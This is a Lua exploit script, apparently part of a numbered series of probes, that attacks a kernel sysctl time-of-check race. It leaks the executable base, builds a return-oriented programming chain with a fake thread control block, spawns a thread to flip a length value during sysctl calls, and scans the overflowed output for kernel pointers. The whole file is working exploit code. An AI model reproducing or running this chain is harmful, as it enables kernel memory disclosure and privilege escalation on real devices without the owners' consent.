-- CRASH_CLASS: MODERATE
-- PROBE 393h: sysctl TOCTOU race — RSP placement fix
--
-- ROOT CAUSE of 393b-393g crashes: ROP chain starts at RSP (near stack top)
-- and grows UPWARD past the allocation, corrupting adjacent heap memory.
-- FIX: allocate large buffer, set stack_size small so RSP is near the bottom,
-- leaving plenty of room for the chain to grow upward within the allocation.

print("=== PROBE 393h: sysctl TOCTOU ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function w64(addr, lo, hi)
    wd(addr, lo or 0)
    wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off
    local hi = eb_hi
    if lo >= 0x100000000 then
        hi = hi + math.floor(lo / 0x100000000)
        lo = lo % 0x100000000
    end
    return lo, hi
end

-- SIGSYS ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Shared race mem
local shared = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(shared) + i, 0) end
local oldlenp_a = N(shared)
local flag_a = N(shared) + 0x10
wd(flag_a, 1)
wd(oldlenp_a, 0x448)

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(fake_tcb, fake_tcb)
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, fake_tcb)

-- KEY FIX: Large buffer with RSP near the bottom
-- Kernel sets RSP = ((stack_base + stack_size) & ~0xF) - 8
-- We want RSP low in the buffer so the chain (growing up) stays inside it.
-- Allocate 0x10000 bytes. Use stack_size=0x100 so RSP = buf + 0xF0 ish.
-- Chain of ~120 qwords = 960 bytes fits easily in the remaining 0xFF00 bytes.
local BUF_SIZE = 0x10000
local stk = memory.alloc(BUF_SIZE)
for i = 0, BUF_SIZE - 4, 4 do wd(N(stk) + i, 0) end
local stk_base = N(stk)
local NOMINAL_SIZE = 0x100
local rsp = ((stk_base + NOMINAL_SIZE) - ((stk_base + NOMINAL_SIZE) % 16)) - 8
local chain_room = BUF_SIZE - (rsp - stk_base)
print(string.format("rsp=%X room=%d", rsp, chain_room))

-- Build chain
local sp = rsp
local function push(val)
    wq(sp, val)
    sp = sp + 8
end

-- sysarch(165=sysarch, 129=SET_FSBASE, &tcb_ptr)
push(uint64(165))
push(g(0xC9DFE))
push(uint64(129))
push(g(0xD77D))
push(uint64(N(tcb_ptr)))
push(g(0x3B02D7))
push(uint64(0))
push(g(0xE64))
push(uint64(0))
push(stub)

-- 10 flip iterations
for i = 1, 10 do
    push(g(0xC9DFE))
    push(uint64(oldlenp_a))
    push(g(0x992))
    push(uint64(0x2000))
    push(g(0x92C67))

    push(g(0xC9DFE))
    push(uint64(oldlenp_a))
    push(g(0x992))
    push(uint64(0x448))
    push(g(0x92C67))
end

-- Signal done
push(g(0xC9DFE))
push(uint64(flag_a))
push(g(0x992))
push(uint64(0))
push(g(0x92C67))

-- thr_exit(431)
push(g(0x992))
push(uint64(431))
push(g(0xC9DFE))
push(uint64(0))
push(stub)

local cq = (sp - rsp) / 8
local chain_bytes = cq * 8
print(string.format("chain=%d qw %d bytes (room=%d)", cq, chain_bytes, chain_room))

-- Verify chain readback
local v0 = rd(rsp)
print(string.format("chain[0]=%08X (expect A5)", v0 or 0))

-- thr_param via wd
local pa = memory.alloc(0x38)
for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
local sf_lo, sf_hi = g_lohi(0x992)
w64(N(pa), sf_lo, sf_hi)
w64(N(pa) + 8, 0, 0)
w64(N(pa) + 0x10, stk_base % 0x100000000, math.floor(stk_base / 0x100000000))
w64(N(pa) + 0x18, NOMINAL_SIZE, 0)
local ctid = memory.alloc(8)
w64(N(ctid), 0, 0)
local ctid_a = N(ctid)
w64(N(pa) + 0x30, ctid_a % 0x100000000, math.floor(ctid_a / 0x100000000))

print("launch")
local ok_t, rv_t = pcall(function()
    return mk(455)(uint64(N(pa)), uint64(0x38))
end)
local tret = ok_t and N(rv_t) or -999
print(string.format("thr=%d", tret))

if tret ~= 0 then print("FAIL"); return end
if not alive() then print("DEAD"); return end

-- Race
print("race")
local mib = memory.alloc(16)
wd(N(mib), 1)
wd(N(mib) + 4, 14)
wd(N(mib) + 8, 1)
wd(N(mib) + 12, pid_val)
local outbuf = memory.alloc(0x2000)
local sc = mk(202)

local over = 0
local kptr = 0
local ok_n = 0

for r = 1, 50 do
    if not alive() then break end
    for i = 0, 0x1FFC, 4 do wd(N(outbuf) + i, 0xDEADDEAD) end
    wd(oldlenp_a, 0x448)

    local ok_s, rv_s = pcall(function()
        return sc(uint64(N(mib)), uint64(4), outbuf,
            uint64(oldlenp_a), uint64(0), uint64(0))
    end)
    if ok_s and N(rv_s) == 0 then
        ok_n = ok_n + 1
        local past = false
        for off = 0x448, 0x460, 4 do
            local d = rd(N(outbuf) + off)
            if d and d ~= 0xDEADDEAD then past = true; break end
        end
        if past then
            over = over + 1
            for off = 0x448, 0x1FF0, 8 do
                local lo_v = rd(N(outbuf) + off)
                local hi_v = rd(N(outbuf) + off + 4)
                if hi_v and hi_v >= 0xFFFF8000 and hi_v < 0xFFFFFFFF then
                    kptr = kptr + 1
                    if kptr <= 5 then
                        print(string.format("KPTR r%d +%03X %08X_%08X",
                            r, off, hi_v, lo_v or 0))
                    end
                end
            end
            if over <= 3 then
                print(string.format("OVER r%d", r))
            end
        end
    end
end

local done = rd(flag_a) == 0
print(string.format("ok=%d over=%d kptr=%d done=%s",
    ok_n, over, kptr, done and "y" or "n"))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 393h COMPLETE ===")
